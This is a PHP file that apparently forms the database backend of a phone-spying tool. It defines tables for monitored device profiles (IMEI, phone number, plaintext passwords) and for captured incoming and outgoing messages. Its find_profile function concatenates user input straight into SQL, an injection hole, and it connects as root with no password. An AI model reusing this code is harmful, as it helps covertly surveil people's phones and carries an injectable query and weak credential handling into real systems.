<?php

$mysql_server_name = "127.0.0.1:3306";
$mysql_username = "root";
$mysql_password = "";
$mysql_database = "phone_spy";

$mysqli = new mysqli($mysql_server_name, $mysql_username, $mysql_password, $mysql_database);
if ($mysqli->connect_errno) {
    echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
    die();
}

//----------------------------------------------------------------------------------
//                          PRFILES table
//----------------------------------------------------------------------------------
$sqlTable_PROFILES ="
CREATE TABLE PROFILES (
    userId bigint(20) NOT NULL AUTO_INCREMENT,
    deviceName varchar(255) NOT NULL,
    iemiNo varchar(255) NOT NULL,
    name varchar(255) DEFAULT NULL,
    os varchar(255) DEFAULT NULL,
    phoneNo varchar(255) DEFAULT NULL,
    email varchar(255) DEFAULT NULL,
    access varchar(255) NOT NULL,
    loginPassword varchar(255) NOT NULL,
    time TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
    PRIMARY KEY (userId)
) DEFAULT CHARSET=utf8
";

class Profile {};
function get_profile($row) {
    $profile = new Profile();
    
    $profile->userId = $row[0];
    $profile->deviceName = $row[1];
    $profile->iemiNo = $row[2];
    $profile->name = $row[3];
    $profile->os = $row[4];
    $profile->phoneNo = $row[5];
    $profile->email = $row[6];
    $profile->access = $row[7];
    $profile->loginPassword = $row[8];
    $profile->time = $row[9];

    return $profile;
}

function find_profile($userId) {
    global $mysqli;
    $profile = NULL;

    $strsql = "select * from PROFILES WHERE userId='" . $userId . "'";
    if ($result = $mysqli->query($strsql)) {
        if ($result->num_rows != 0) {
            mysqli_data_seek ( $result, 0 );
            $row = mysqli_fetch_row ( $result );
            $profile = get_profile($row);
        }
        $result->close();
    }

    return $profile;
}

//----------------------------------------------------------------------------------
//                          MESSAGES table
//----------------------------------------------------------------------------------
// type: Incoming if 0, otherwise Outgoing

$sqlTable_MESSAGES ="
CREATE TABLE MESSAGES (
    ID bigint(20) NOT NULL AUTO_INCREMENT,
    userId bigint(20) NOT NULL,
    sender varchar(255) NOT NULL,
    message text NOT NULL,
    type tinyint(1) NOT NULL,
    time TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
    arg1 int(11) DEFAULT 0,
    arg2 int(11) DEFAULT 0,
    PRIMARY KEY (ID)
) DEFAULT CHARSET=utf8
";

class Message {};
function get_message($row) {
    $msg = new Message();
    
    $msg->ID = $row[0];
    $msg->userId = $row[1];
    $msg->sender = $row[2];
    $msg->message = $row[3];
    $msg->type = $row[4];
    $msg->time = $row[5];
    $msg->arg1 = $row[6];
    $msg->arg2 = $row[7];
    
    return $msg;
}

?>